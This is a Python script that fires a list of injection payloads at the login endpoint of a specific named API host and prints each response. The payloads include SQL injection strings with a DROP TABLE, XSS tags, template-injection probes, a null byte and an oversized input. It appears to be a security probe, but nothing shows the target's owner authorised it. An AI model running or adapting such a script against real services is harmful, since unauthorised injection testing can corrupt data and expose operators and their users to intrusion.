import requests
import time

URL = "https://dsapi.thelocal.co.in/dc/api/v1/auth/login"

headers = {
    "Content-Type": "application/json",
    "Accept": "application/json"
}

payload = {
    "email": "",
    "password": "InvalidTestPassword123!",
    "platform": "android",
    "deviceId": "security-test-device"
}

test_inputs = [
    "' OR '1'='1",
    "admin'--",
    "test@example.com' AND '1'='1",
    "' UNION SELECT NULL--",
    "test@example.com; DROP TABLE users",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "{{7*7}}",
    "${7*7}",
    "test@example.com%00",
    "test@@example.com",
    "A" * 256
]

for index, value in enumerate(test_inputs, 1):

    payload["email"] = value

    try:
        start = time.time()

        response = requests.post(
            URL,
            json=payload,
            headers=headers,
            timeout=15
        )

        elapsed = round(time.time() - start, 3)

        print(f"\nTest {index}: {value[:45]}")
        print("HTTP Status:", response.status_code)
        print("Response Time:", elapsed)
        print("Response:", response.text[:300])

        if response.status_code == 429:
            print("RATE LIMITED - STOPPING TESTS")
            break

        time.sleep(3)

    except requests.RequestException as error:
        print("Request error:", error)
        break